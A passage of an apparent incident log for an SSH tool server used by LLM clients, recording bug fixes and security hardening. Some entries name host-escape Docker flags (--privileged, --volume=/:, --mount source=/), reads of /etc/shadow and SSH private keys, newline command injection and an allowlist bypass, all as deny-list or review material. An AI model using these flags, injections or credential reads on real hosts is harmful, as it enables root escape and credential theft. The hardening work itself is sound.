- **Refs:** [ssh/connection.py:87-94](src/ssh_mcp/ssh/connection.py#L87-L94)

Mismatch message surfaced the placeholder string `"<received>"` because asyncssh's `HostKeyNotVerifiable` doesn't expose the server's offered key. Looked like a broken f-string to operators chasing a real mismatch. Replaced with `"unknown (asyncssh did not expose the received key)"` and a comment naming `ssh-keyscan -p <port> <host>` as the OOB fetch path.

### INC-036 — `ConnectionPool._reap_once()` iterated dict during concurrent mutation

- **Date:** 2026-04-17 · **Severity:** High · **Status:** resolved
- **Source:** code-review (project review)
- **Refs:** [ssh/pool.py:151-181](src/ssh_mcp/ssh/pool.py#L151-L181)

`for key, entry in self._entries.items():` ran in a background reaper task; concurrent `pool.acquire` / `release` from tool calls could insert/drop entries during the scan and raise `RuntimeError: dictionary changed size during iteration`. Race was narrow (reap loop fires every 60s) but real — intermittent prod crashes on busy pools. Snapshotted via `list(self._entries.items())`; comment names the race. Second pass (by-key lookup with `get`) already handled missing entries correctly.

### INC-035 — `ssh/exec.py` cancelled pump tasks on timeout without awaiting

- **Date:** 2026-04-17 · **Severity:** High · **Status:** resolved
- **Source:** code-review (project review)
- **Refs:** [ssh/exec.py:225-248](src/ssh_mcp/ssh/exec.py#L225-L248)

Timeout path called `pump_out.cancel()` / `pump_err.cancel()` and moved on without `await`. Two symptoms: (1) "Task exception was never retrieved" warning if a pump raised during cancel teardown (reader error mid-read), (2) lingering task references to the closing SSH channel. Added `await asyncio.gather(pump_out, pump_err, return_exceptions=True)` immediately after the cancels; comment explains why `return_exceptions=True` swallows the `CancelledError` + any secondary error cleanly.

### INC-034 — Windows SFTP `realpath` returns Cygwin form `/C:/...`

- **Date:** 2026-04-17 · **Severity:** High · **Status:** resolved
- **Source:** e2e-test (first full-catalog run against a real Windows OpenSSH target)
- **Refs:** [path_policy.py:245-262](src/ssh_mcp/services/path_policy.py#L245-L262), [tests/test_windows_target.py:266-304](tests/test_windows_target.py#L266-L304), [tests/e2e/](tests/e2e/), [BACKLOG entry 2026-04-17](BACKLOG.md)

OpenSSH-for-Windows' SFTP subsystem returns `realpath` results in Cygwin/WSL form — `C:\Users` comes back as `/C:/Users` (leading slash before the drive letter). `_canonicalize_windows` checked `_is_windows_absolute` on the raw result, which matches `C:\`, `C:/`, and UNC forms but not the Cygwin one, so every SFTP read / stat / upload against a Windows target raised `PathNotAllowed: canonicalized path is not absolute: '/C:/Users'`. ADR-0023 ships Windows as a first-class target, so this broke the whole SFTP path on the target class the ADR was written for. Fix: strip the single-character prefix when `path[0] == "/" and path[2:4] in (":/", ":\\") and path[1].isalpha()` — a predicate tight enough to leave UNC (`//host/share`) alone, since UNC starts with `//` and never has `:/` at offset 2. Surfaced by the new e2e suite on the first run against test_windows11; post-fix code review (2026-04-17) flagged that the fix shipped without a regression unit test — closed by [tests/test_windows_target.py::test_sftp_realpath_cygwin_form_is_normalized + test_unc_realpath_is_not_stripped](tests/test_windows_target.py#L266-L304), pinning both the Cygwin normalization and the UNC-pass-through contract.

### INC-033 — `ssh_docker_volumes(name=...)` exit_code semantics undocumented

- **Date:** 2026-04-16 · **Severity:** Medium · **Status:** resolved
- **Source:** code-review (docker events+volumes review, I2)
- **Refs:** [docker_tools.py:499-515](src/ssh_mcp/tools/docker_tools.py#L499-L515), [BACKLOG entry 2026-04-16](BACKLOG.md)

`ssh_docker_volumes(name="missing")` returned `{"volumes": [], "exit_code": 1, "stderr": "No such volume..."}`. Parity with `ssh_docker_inspect` but the docstring didn't call out that `[]` on non-zero exit means "lookup failed", not "genuinely empty". LLM callers could silently misread a lookup failure. Docstring now explicit: "caller MUST read `exit_code` and `stderr` to distinguish". No behavior change.

### INC-032 — `_DOCKER_TIME_RE` accepts `d` but Go rejects it

- **Date:** 2026-04-16 · **Severity:** Low · **Status:** resolved
- **Source:** code-review (docker events+volumes review, I1)
- **Refs:** [docker_tools.py:394-408](src/ssh_mcp/tools/docker_tools.py#L394-L408), [tests/test_docker_events_volumes.py](tests/test_docker_events_volumes.py)

`docker events --since 7d` routes through Go's `time.ParseDuration`, which recognizes `ns`/`us`/`ms`/`s`/`m`/`h` but NOT `d`. Our regex accepted `7d` and the daemon would have returned `time: unknown unit "d"`. Regex now restricts to `s`/`m`/`h`; docstring explains and suggests `168h` for 7 days. Two `d`-smuggling cases (`7d`, `1d2h`) added to the reject-parametrize.

### INC-031 — `ssh_file_hash` Windows branch used POSIX `shlex.join` quoting

- **Date:** 2026-04-16 · **Severity:** Critical · **Status:** resolved
- **Source:** code-review (file-hash + docker review, B1)
- **Refs:** [sftp_read_tools.py:245-310](src/ssh_mcp/tools/sftp_read_tools.py#L245-L310), **also INC-028 (open Windows item)**

`_hash_windows` assembled `powershell -NoProfile -NonInteractive -Command '(...)'` via `shlex.join`. POSIX `shlex.join` emits the `'"'"'` three-char dance for embedded apostrophes — POSIX-shell-only. Windows OpenSSH's default shell (cmd.exe) would land the entire first token as a literal string; PowerShell's own parser doesn't match this escape form either. First real Windows call would have crashed loudly. Test `test_path_with_single_quote_escaped` only verified `shlex.join` round-trips through `shlex.split` — proved nothing about the remote parser. Gated via `require_posix`; Windows branch + `_WINDOWS_HASH_ALGO` removed; see INC-028 for the open Windows-support item.

### INC-030 — `ssh_file_hash` timeout docstring lie + no param

- **Date:** 2026-04-16 · **Severity:** High · **Status:** resolved
- **Source:** code-review (file-hash review, B1)
- **Refs:** [sftp_read_tools.py:245-355](src/ssh_mcp/tools/sftp_read_tools.py#L245-L355), [tests/test_file_hash.py](tests/test_file_hash.py)

Docstring claimed "bump the env var or the per-call timeout if you need", but no `timeout` parameter existed and `conn.run(...)` was called without `timeout=`. Added `timeout: int | None = None` to the signature, wired through to both hash helpers matching the project's existing `effective_timeout = float(timeout if timeout is not None else settings.SSH_COMMAND_TIMEOUT)` pattern. Plus test gaps: canonical-vs-raw path, stat-failure → `-1` sentinel, timeout propagation through to `conn.run`.

### INC-029 — `ssh_docker_cp` missing `effective_restricted_paths`/`check_not_restricted` imports → NameError

- **Date:** 2026-04-16 · **Severity:** High · **Status:** resolved
- **Source:** code-review (post-merge review after INC-022 follow-ups, B1)
- **Refs:** [docker_tools.py:34-39](src/ssh_mcp/tools/docker_tools.py#L34-L39), [tests/test_docker_top_cp.py](tests/test_docker_top_cp.py), **AGENTS-MCP §21** (upstream lesson)

`ssh_docker_cp` referenced `effective_restricted_paths` + `check_not_restricted` but the import only brought in `canonicalize_and_check` + `effective_allowlist`. Pre-validation tests short-circuited on `_validate_name` / direction check before reaching the path-policy block, so the missing imports never showed up. Every real call would have `NameError`'d. Imports added; three happy-path argv-shape tests added that drive past validation with stubbed I/O; verified the new tests would have caught the bug by temporarily deleting the imports. This is the canonical example of the "pre-validation tests aren't enough" lesson now documented in AGENTS-MCP §21.

### INC-028 — `ssh_file_hash` has no Windows implementation

- **Date:** 2026-04-16 · **Severity:** Medium · **Status:** resolved · **Legacy:** W1
- **Source:** internal-review (triggered by INC-031 fix)
- **Refs:** [sftp_read_tools.py:323-378](src/ssh_mcp/tools/sftp_read_tools.py#L323-L378) (`_hash_windows`), [sftp_read_tools.py:290-326](src/ssh_mcp/tools/sftp_read_tools.py#L290-L326) (platform dispatch), [tests/test_file_hash.py](tests/test_file_hash.py) (`TestWindowsHashing`), [tests/e2e/test_e2e_real_hosts.py](tests/e2e/test_e2e_real_hosts.py) (`test_file_hash`)

After INC-031, `ssh_file_hash` gated Windows via `require_posix`. A proper implementation needed PowerShell's `-EncodedCommand <base64-UTF16LE>` (single opaque argv token, no shell quoting on the path) plus a way to ship it that cmd.exe can't mangle.

**Fix (2026-04-17):** added `_hash_windows(conn, canonical, algorithm, timeout)` which:

1. Builds a literal PowerShell script: `(Get-FileHash -Algorithm <ALGO> -LiteralPath '<escaped-path>').Hash` — the path is escaped using PowerShell's single-quote literal rule (`'` → `''`), and `-LiteralPath` takes the value verbatim (no wildcard expansion).
2. Encodes the script as `base64(script.encode("utf-16-le"))` — a pure-ASCII token PowerShell's `-EncodedCommand` consumes unchanged.
3. Invokes `powershell.exe -NoProfile -NonInteractive -EncodedCommand <b64>` as a single command line. All outer tokens are safe ASCII, so cmd.exe's parser doesn't get a chance to misquote anything.

`ssh_file_hash` body dispatches on `policy.platform` (`_hash_windows` vs `_hash_posix`); `require_posix` is dropped entirely. `Get-FileHash` returns uppercase hex — the parser lowercases to match POSIX. Regression tests in `tests/test_file_hash.py::TestWindowsHashing`:

- `test_invokes_powershell_encoded_command` — parametrized over MD5/SHA1/SHA256/SHA512; base64-decodes the captured command and checks the inner script names the right algorithm + LiteralPath.
- `test_windows_path_with_single_quote_is_ps_escaped` — a path like `O'Brien.txt` shows up as `'O''Brien.txt'` inside the script. The "operator has a file with an apostrophe" scenario would otherwise inject unquoted script.
- `test_windows_non_zero_exit_raises_HashError` — same error-surface contract as POSIX.

The e2e suite's `test_file_hash_posix` renamed to `test_file_hash` and now exercises both platforms; on `test_windows11` it hashes `C:\Windows\System32\drivers\etc\hosts` and asserts 64-char lowercase-hex SHA-256. 456 unit tests green.

### INC-027 — Shell-session lock has no end-to-end test

- **Date:** 2026-04-15 · **Severity:** Low · **Status:** n/a (superseded by INC-047) · **Legacy:** N3b
- **Source:** internal-review (post-fix review)
- **Refs:** [INC-047](INCIDENTS.md#inc-047--shell-session-cwd-has-no-async-safe-update-api), [services/shell_sessions.py:38-87](src/ssh_mcp/services/shell_sessions.py#L38-L87)

Original concern: the INC-023 regression test exercised the `asyncio.Lock` primitive but didn't drive `ssh_shell_exec` end-to-end, so a future refactor that bypassed `session.lock` before writing `session.cwd` wouldn't trip.

**Superseded by INC-047 (2026-04-17).** INC-047 replaced the discipline-only lock contract with a runtime-enforced one: `ShellSession.set_cwd` now asserts `self.lock.locked()` at the write site and `exec_scope()` is the single approved way to hold the lock. The "caller forgot to acquire the lock" regression class is eliminated by construction — any bypass raises `RuntimeError` the first time it's exercised, in any code path. The end-to-end test this entry proposed is no longer necessary: the `test_set_cwd_outside_exec_scope_raises` unit test in INC-047 catches the same failure mode cheaper and without mocking `exec_run`.

### INC-026 — Tautological assertion in shell-session lock test

- **Date:** 2026-04-15 · **Severity:** Low · **Status:** resolved · **Legacy:** N3a
- **Refs:** [tests/test_shell_sessions.py:203-205](tests/test_shell_sessions.py#L203-L205)

`assert (entered[0], exited[0]) == (entered[0], entered[0])` reduced to `exited[0] == entered[0]`, which was re-asserted on the next line. Tautology removed; the remaining `exited[i] == entered[i]` pair pins the serialization invariant.

### INC-025 — Container-namespace join flags not covered

- **Date:** 2026-04-15 · **Severity:** Low · **Status:** resolved · **Legacy:** N2b
- **Source:** internal-review (post-fix review of INC-022)
- **Refs:** [docker_tools.py:109-129](src/ssh_mcp/tools/docker_tools.py#L109-L129), [tests/test_docker_run_escalation.py](tests/test_docker_run_escalation.py)

After INC-024 closed `--mount source=/`, the namespace-share checker still only rejected literal `host`. `--pid=container:<id>` forms join another container's namespace — weaker than host escape but still an isolation break. Now rejects `=container:<id>` prefix form AND two-token form for all six namespace flags.

### INC-024 — `--mount` bypassed docker-run escalation deny-list

- **Date:** 2026-04-15 · **Severity:** Medium · **Status:** resolved · **Legacy:** N2a
- **Source:** internal-review (post-fix review of INC-022)
- **Refs:** [docker_tools.py:76-166](src/ssh_mcp/tools/docker_tools.py#L76-L166), [tests/test_docker_run_escalation.py](tests/test_docker_run_escalation.py)

`_reject_escalation_flags` from INC-022 covered `--volume=/:` but not `--mount type=bind,source=/,target=/host`. New `_mount_source_is_host_root` parses the KV value format and rejects host-root source. Handles `//`, `/./`, trailing-slash edge cases via `posixpath.normpath`.

### INC-023 — Shell-session state caller-serialized, not locked

- **Date:** 2026-04-15 · **Severity:** Low · **Status:** resolved · **Legacy:** N3
- **Refs:** [shell_sessions.py:42-49](src/ssh_mcp/services/shell_sessions.py#L42-L49), [shell_tools.py:84-104](src/ssh_mcp/tools/shell_tools.py#L84-L104)

Two concurrent `ssh_shell_exec` calls with the same `session_id` raced on the `cwd` update after sentinel parsing. Per-session `asyncio.Lock` added; `ssh_shell_exec` wraps exec + cwd update under the lock. Cheap when uncontended.

### INC-022 — `ssh_docker_run` accepts arbitrary docker flags

- **Date:** 2026-04-15 · **Severity:** Medium · **Status:** resolved · **Legacy:** N2
- **Refs:** [docker_tools.py:56-114](src/ssh_mcp/tools/docker_tools.py#L56-L114), [config.py:50](src/ssh_mcp/config.py#L50), [SKILL.md](skills/ssh-docker-run/SKILL.md)

Under `ALLOW_DANGEROUS_TOOLS=true`, `args: list[str]` was appended verbatim to `docker run`. Flags like `--privileged`, `--cap-add`, `--network=host`, `--volume=/:` granted root on the target host. Operators who flipped the tier for "one-shot run" unknowingly granted host escape. New `_reject_escalation_flags` deny-list + `ALLOW_DOCKER_PRIVILEGED` opt-in. Docstring + SKILL spell out the capability-escalation surface. Follow-ups INC-024 (`--mount`) and INC-025 (`container:<id>`) closed gaps found in post-fix review.

### INC-021 — Unbounded fire-and-forget hook tasks

- **Date:** 2026-04-15 · **Severity:** Medium · **Status:** resolved · **Legacy:** N1
- **Refs:** [hooks.py:80-89](src/ssh_mcp/services/hooks.py#L80-L89), [tests/test_hooks.py:189-258](tests/test_hooks.py#L189-L258)

`HookRegistry.emit(blocking=False)` spawned tasks via `asyncio.create_task(...)` without tracking. A hook that re-scheduled itself or ran slower than the event cadence could pile up pending tasks unboundedly. Now tracks tasks in a `set[Task]` with a `discard` done-callback; warns once when pending crosses a threshold (default 100).

### INC-020 — Commit-message-style review: SSRF / hardcoded fallbacks / typos / stray `}`

- **Date:** 2026-04-16 · **Severity:** N/A · **Status:** n/a (partial-applied)
- **Source:** code-review
- **Refs:** [connection.py:22-28](src/ssh_mcp/ssh/connection.py#L22-L28), [sudo.py:41-46](src/ssh_mcp/ssh/sudo.py#L41-L46)

Four-bullet review from an unrelated Node/TS project applied against our codebase:
- **SSRF bypass** — **N/A**, we have no URL-parser or HTTP-fetch surface. SSH hostnames route through `hosts.toml` + `SSH_HOSTS_ALLOWLIST` + strict `known_hosts`, not an IP-classifier.
- **Hardcoded fallback defaults** — minor hit: two `timeout=10` literals in `_run_command_for_secret` + `_run_secret_cmd`. Extracted to named `_SECRET_CMD_TIMEOUT_SECONDS = 10` module constants with rationale comment. Behavior unchanged.
- **Typos** — grep pass clean.
- **Stray `}` in template literal** — N/A, Python f-strings are compiler-checked.

### INC-019 — `classfang/ssh-mcp-server#31` — the input device is not a TTY

- **Date:** 2026-04-15 · **Severity:** N/A · **Status:** n/a (hardening-added)
- **Source:** external-issue
- **Refs:** [exec.py:42-65](src/ssh_mcp/ssh/exec.py#L42-L65), [DECISIONS.md ADR-0022](DECISIONS.md)

External report: tools that require a TTY (`sudo`, `top`, `passwd`) fail against stdio-based SSH. We deliberately don't allocate a remote PTY (see `services/shell_sessions.py` docstring). Added `ExecResult.hint` field that populates on recognizable `is not a tty` / `must be run from a terminal` stderr markers, pointing the LLM at batch-mode alternatives (`top -bn1`, `chpasswd`, etc.). ADR-0022 records the decision to keep the no-PTY posture + use the hint field.

### INC-018 — `tufantunc/ssh-mcp#44` — newline injection via `description` metadata field

- **Date:** 2026-04-15 · **Severity:** N/A · **Status:** n/a (not applicable)
- **Source:** external-issue

External report: a `description` parameter on the exec tool was interpolated into the shell command; newlines in the field injected arbitrary commands. **N/A for us**: we have no "metadata field that secretly becomes shell". Shell-bound fields (`command`, `script`) are explicit, allowlist-checked, and caller-owned. Identifier fields (container/image/service names) are regex-validated at the tool boundary. `wrap_command` in shell_sessions uses `shlex.quote` on the cwd. See conversation record in BACKLOG for the full comparison matrix.

### INC-017 — `tufantunc/ssh-mcp#42` — credentials in process argv / `ps`

- **Date:** 2026-04-15 · **Severity:** N/A · **Status:** n/a (covered)
- **Source:** external-issue
- **Refs:** [sudo.py:166-177](src/ssh_mcp/ssh/sudo.py#L166-L177) (INC-009 fix), [connection.py:131](src/ssh_mcp/ssh/connection.py#L131)

External report: server launched with `--password=...` in argv exposes credentials via `ps` / `/proc`. **Already covered**: `SSH_SUDO_PASSWORD` env var rejected at startup (INC-009); sudo password piped over stdin, never argv; `password_cmd` / `passphrase_cmd` subprocess helpers never receive secrets as argv. Indirect risk: an operator-configured `password_cmd = "echo MyPass"` would leak via `ps` — that's operator misconfiguration, documented in [skills/ssh-exec-run/SKILL.md](skills/ssh-exec-run/SKILL.md) / README.

### INC-016 — `tufantunc/ssh-mcp#2` — no default command timeout

- **Date:** 2026-04-15 · **Severity:** N/A · **Status:** n/a (covered)
- **Source:** external-issue
- **Refs:** [config.py:109-113](src/ssh_mcp/config.py#L109-L113), [exec.py:42-70](src/ssh_mcp/ssh/exec.py#L42-L70)

External report: LLM clients forget to pass a timeout, hang forever. **Already covered** since Phase 1: `SSH_COMMAND_TIMEOUT=60` default enforced via `asyncio.wait_for`. Plus `SSH_CONNECT_TIMEOUT=10`, `SSH_IDLE_TIMEOUT=300`, `SSH_KEEPALIVE_INTERVAL=30`, per-call `timeout` parameter on every exec tool.

### INC-015 — `bvisible/mcp-ssh-manager#13` — AgentWard audit

- **Date:** 2026-04-15 · **Severity:** N/A · **Status:** n/a (hardening-added)
- **Source:** audit-report
- **Refs:** [DECISIONS.md ADR-0021](DECISIONS.md), [hosts.py:150-186](src/ssh_mcp/hosts.py#L150-L186)

External audit of `mcp-ssh-manager`: 37 tools granting unrestricted SSH access, `ssh_execute` with zero filtering, `ssh_execute_sudo` plaintext password in argv/ps, `ssh_tunnel_create` unrestricted SOCKS5, no path allowlist, SQL-keyword-based query validation. Comparison against our architecture:
- ✓ Command allowlist + fail-closed when empty (ADR-0018)
- ✓ Sudo password via `-S` + stdin (INC-009 / INC-017)
- N/A Tunnel / SOCKS: not implemented (deferred in DECISIONS.md)
- ✓ Path allowlist + `restricted_paths` carve-outs + `canonicalize_and_check` (ADR-0017)
- N/A SQL query tool: not implemented
- ✓ Tiered approval gates via `Visibility` transforms (ADR-0001)

**Hardening added**: ADR-0021 — defense-in-depth WARNING at startup when `path_allowlist=["*"]` but `restricted_paths` doesn't cover `/etc/shadow`/`/etc/sudoers`/`/etc/ssh`. Operator gets a clear pointer at startup; not enforced (containers / embedded hosts genuinely don't have these).

### INC-014 — SFTP magic error codes

- **Date:** 2026-04-14 · **Severity:** Low · **Status:** resolved · **Legacy:** L2
- **Refs:** [low_access_tools.py:146](src/ssh_mcp/tools/low_access_tools.py#L146), [:329](src/ssh_mcp/tools/low_access_tools.py#L329)

Magic numbers like `exc.code == 2` scattered across SFTP error handling; brittle across asyncssh versions. Replaced with `asyncssh.sftp.FX_NO_SUCH_FILE` / `FX_FAILURE` / `FX_OP_UNSUPPORTED` / `FX_LINK_LOOP` constants.

### INC-013 — Host policy lacked port-range / type / absolute-path validation

- **Date:** 2026-04-14 · **Severity:** Low · **Status:** resolved · **Legacy:** L1
- **Refs:** [tests/test_host_policy_validation.py](tests/test_host_policy_validation.py)

Field validators on `HostPolicy` for port (1..65535), type (no negative ints as port), and absolute path enforcement on `path_allowlist` were missing. Regression tests added. Field validators on `HostPolicy` at [models/policy.py:94-117](src/ssh_mcp/models/policy.py#L94-L117).

### INC-012 — Absolute-path `command_allowlist` entries basename-matched

- **Date:** 2026-04-14 · **Severity:** Medium · **Status:** resolved (tightened) · **Legacy:** M5
- **Refs:** [exec_policy.py:61-81](src/ssh_mcp/services/exec_policy.py#L61-L81)

Allowlist entry `/usr/bin/systemctl` would match program `/opt/rogue/systemctl` via basename — shadow-binary bypass for operators who intentionally wrote absolute allowlist entries. Now: absolute entries require EXACT match; basename fallback retained for bare entries (`systemctl`) so `$PATH`-style usage still works.

### INC-011 — Streaming `chunk_cb` received more bytes than buffer captured

- **Date:** 2026-04-14 · **Severity:** Medium · **Status:** resolved · **Legacy:** M1
- **Refs:** [exec.py:194-197](src/ssh_mcp/ssh/exec.py#L194-L197)

`chunk_cb` was called with the full incoming chunk even when the output-cap clipped part of it. Consumers saw bytes that `stdout` discarded. Now: callback only receives the captured slice, matching the buffer.

### INC-010 — `ssh_edit` / `ssh_patch` crash on non-UTF-8 files

- **Date:** 2026-04-14 · **Severity:** High · **Status:** resolved · **Legacy:** H4
- **Refs:** [edit_service.py](src/ssh_mcp/services/edit_service.py), [low_access_tools.py:276](src/ssh_mcp/tools/low_access_tools.py#L276)

UnicodeDecodeError surfaced as a traceback. Now `errors="replace"` throughout the edit path; non-UTF-8 content surfaces as a clean `WriteError`.

### INC-009 — `SSH_SUDO_PASSWORD` env-var accepted

- **Date:** 2026-04-14 · **Severity:** High · **Status:** resolved · **Legacy:** H3
- **Refs:** [sudo.py:166-177](src/ssh_mcp/ssh/sudo.py#L166-L177), [lifespan.py:81](src/ssh_mcp/lifespan.py#L81)

Env vars leak into child processes, crash dumps, and `/proc/self/environ`. Passing a sudo password through an env var is footgunny even if the immediate code doesn't leak. `reject_env_password()` now raises at startup if `SSH_SUDO_PASSWORD` is set; operator is directed to `SSH_SUDO_PASSWORD_CMD` (subprocess) or OS keyring.

### INC-008 — Audit `error` field leaks full exception text

- **Date:** 2026-04-14 · **Severity:** High · **Status:** resolved · **Legacy:** H2
- **Refs:** [services/audit.py](src/ssh_mcp/services/audit.py)

Exception text in audit records could carry remote stderr — sudo prompts, paths, internal errors. Audit pipes often ship to shared log backends. Now: `error` field records the exception class name only; full `str(exc)` stays at DEBUG on the same logger locally, correlated via `correlation_id`.

### INC-007 — `UnknownHost` vs `HostKeyMismatch` disambiguated by exception text substring

- **Date:** 2026-04-14 · **Severity:** High · **Status:** resolved · **Legacy:** H1
- **Refs:** [connection.py:74-79](src/ssh_mcp/ssh/connection.py#L74-L79)

Both conditions surfaced as `asyncssh.HostKeyNotVerifiable` with different message substrings. Substring-sniffing for security-class errors is brittle and version-dependent. Now: `known_hosts.fingerprint_for()` lookup determines which case applies — if there's no pinned fingerprint, it's `UnknownHost`; if there is and it doesn't match, it's `HostKeyMismatch` (which carries both expected and actual fingerprints).

### INC-006 — `KnownHosts.fingerprint_for` silently returned `None`

- **Date:** 2026-04-15 · **Severity:** Critical · **Status:** resolved · **Legacy:** C4
- **Refs:** [known_hosts.py:99-114](src/ssh_mcp/ssh/known_hosts.py#L99-L114), [tests/test_known_hosts.py:94-119](tests/test_known_hosts.py#L94-L119)

`KnownHosts.fingerprint_for` unpacked 3 values from asyncssh's 7-tuple `match()` return, caught the resulting `ValueError`, and silently returned `None`. Impact:
- `ssh_host_ping` never reported the pinned fingerprint.
- `ssh_known_hosts_verify` always reported `expected_fingerprint=None`.
- INC-007 silently degraded to "always `UnknownHost`" — a real MITM / key rotation would have been mislabeled.

Fix: use indexing (`result[0]`) + stop swallowing `ValueError`. Regression guard generates a real ed25519 key via `asyncssh.generate_private_key` and round-trips through the full match path. Discovered during Pageant end-to-end verification on Windows.

### INC-005 — Streaming `_pump` byte counters not updated per chunk

- **Date:** 2026-04-14 · **Severity:** Critical · **Status:** resolved · **Legacy:** C3
- **Refs:** [exec.py:174-197](src/ssh_mcp/ssh/exec.py#L174-L197)

On timeout, the streaming exec returned `stdout_truncated=False` even if output had grown past the cap. Byte counters were set only on clean EOF; cancellation bypassed that. Now: counters update nonlocal per chunk, truncation flag is correct on timeout path.

### INC-004 — `assert` before `rm -rf` stripped under `python -O`

- **Date:** 2026-04-14 · **Severity:** Critical · **Status:** resolved · **Legacy:** C2
- **Refs:** [low_access_tools.py:219-221](src/ssh_mcp/tools/low_access_tools.py#L219-L221)

`assert re_canonical == canonical` guarded `rm -rf -- <canonical>` from a TOCTOU race. `python -O` strips asserts at compile time; the server would silently remove the rail. Replaced with explicit `raise WriteError(...)`.

### INC-003 — `SSH_ENABLED_GROUPS` field missing from `Settings`

- **Date:** 2026-04-14 · **Severity:** Critical · **Status:** resolved · **Legacy:** C1
- **Refs:** [config.py:62](src/ssh_mcp/config.py#L62), `test_config_has_every_field_lifespan_reads`

The lifespan read `settings.SSH_ENABLED_GROUPS` to apply group-visibility transforms. The field was missing from `Settings`. Every server startup crashed with `AttributeError`. Added with `default_factory=list`; regression test ensures future code splits don't drop the field without updating the lifespan consumer.

### INC-002 — External review: path confinement must apply to reads (ADR-0017 trigger)

- **Date:** 2026-04-14 · **Severity:** N/A · **Status:** n/a (hardening-added)
- **Source:** external-issue (external-review feedback pass)
- **Refs:** [DECISIONS.md ADR-0017](DECISIONS.md), [tests/test_read_tool_path_confinement.py](tests/test_read_tool_path_confinement.py)

External review flagged that "read-only" tools (`ssh_sftp_list`, `_stat`, `_download`, `ssh_find`) skipped `canonicalize_and_check`. "Read-only" means no mutation, NOT no scope — an LLM could still SFTP-download `/etc/shadow` or `/root/.ssh/id_ed25519` from any allowlisted host. ADR-0017 records the decision to apply path confinement to every path-bearing tool, read or write, via the same helper. Regression guard in the test file prevents future contributors from silently dropping the check.

### INC-001 — External review: empty `command_allowlist` footgun (ADR-0018 trigger)

- **Date:** 2026-04-14 · **Severity:** N/A · **Status:** n/a (hardening-added)
- **Source:** external-issue (external-review feedback pass)
- **Refs:** [DECISIONS.md ADR-0018](DECISIONS.md), [exec_policy.py:42-49](src/ssh_mcp/services/exec_policy.py#L42-L49)

External review flagged the convention "empty `command_allowlist` = no restriction" as a deployment footgun: operators reading "empty allowlist" naturally expect "nothing allowed". An operator flipping `ALLOW_DANGEROUS_TOOLS=true` without also setting an allowlist got an unrestricted exec server when they intended a locked-down one. ADR-0018 records the decision to fail closed; `ALLOW_ANY_COMMAND=true` is the only way to permit arbitrary commands with an empty allowlist.

---

## Triggering sources — quick index

- **Internal review passes** (2026-04-14, 2026-04-15): INC-003..INC-014, INC-021..INC-023
- **Internal post-fix review** (2026-04-15): INC-024..INC-027
- **External code review** (2026-04-16, two separate batches): INC-029, INC-030, INC-031, INC-032, INC-033
- **External project scans**: INC-015 (audit), INC-016, INC-017, INC-018, INC-019
- **External feedback pass**: INC-001, INC-002
- **Commit-message-style review** (2026-04-16): INC-020
- **Live-verification findings**: INC-006 (discovered during Pageant end-to-end)
